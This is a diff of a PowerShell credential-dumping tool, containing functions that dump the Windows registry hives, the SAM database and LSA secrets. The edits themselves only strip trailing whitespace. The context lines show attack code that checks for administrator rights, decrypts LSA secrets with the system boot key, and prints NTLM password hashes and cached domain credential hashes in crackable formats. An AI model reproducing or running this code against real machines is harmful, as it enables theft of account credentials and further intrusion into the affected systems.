@@ -18,7 +18,7 @@ Function Invoke-HiveDump {
 
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
-        Write-Warning "This command must be launched as an Administrator" 
+        Write-Warning "This command must be launched as an Administrator"
         return
     }
 
@@ -425,9 +425,9 @@ Function Invoke-SAMDump {
     Get-UserKeys | % {
         $hashes = Get-UserHashes $_ $hBootKey
         Write-Output ("{0}:{1}:{2}:{3}" -f (
-            $_.UserName, 
-            $_.Rid, 
-            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(), 
+            $_.UserName,
+            $_.Rid,
+            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
             [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower()
         ))
     }
@@ -451,7 +451,7 @@ Function Invoke-LSADump {
             )
 
             PROCESS {
-                # Create a SHA256 object 
+                # Create a SHA256 object
                 $sha256 = [Security.Cryptography.SHA256]::Create()
 
                 # Derive the encryption key (first hash with the key, and then 1000 times with IV)
@@ -468,7 +468,7 @@ Function Invoke-LSADump {
                 $aes.Padding="None"
                 $aes.KeySize = 256
                 $aes.Key = $encryptionKey
-                
+
                 # Decrypt the data
                 $dec = $aes.CreateDecryptor()
                 $decryptedData = $dec.TransformFinalBlock($Data,0,$Data.Count)
@@ -509,7 +509,7 @@ Function Invoke-LSADump {
 
             # Get the size
             $BlobSize = [BitConverter]::ToInt32($PasswordBlob, 0)
-            
+
             # Get the actual data (strip the first four DWORDs)
             $Blob = $PasswordBlob[16..$(16+$BlobSize-1)]
 
@@ -525,7 +525,7 @@ Function Invoke-LSADump {
 
             # Get the stream size
             $streamSize = [BitConverter]::ToInt32($KeyStream,0)
-            
+
             # Get the actual data (strip the first four DWORDs)
             $streamData = $KeyStream[16..$(16+$streamSize-1)]
 
@@ -583,7 +583,7 @@ Function Invoke-LSADump {
 
         # Get the encryption key Blob
         $encKeyBlob = Parse-LSASecretBlob -Data (Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)")
-        
+
         # Decrypt the encryption key Blob using the syskey
         $decKeyBlob = Decrypt-LSASecretData -Data ($encKeyBlob.Data) -Key $syskey -InitialVector ($encKeyBlob.IV)
 
@@ -660,9 +660,9 @@ Function Invoke-LSADump {
                     $domain = [Text.Encoding]::Unicode.GetString($plaintext[$offset..$(Pad($offset + $dnsDomainLength - 1))])
                     $domain = $domain.Trim([char] 0)
                     Write-Output ("{0}/{1}:`$DCC2`$10240#{2}#{3}" -f (
-                        $domain, 
-                        $username, 
-                        $username, 
+                        $domain,
+                        $username,
+                        $username,
                         [BitConverter]::ToString($hashedPW).Replace("-","").ToLower()
                     ))
                 }
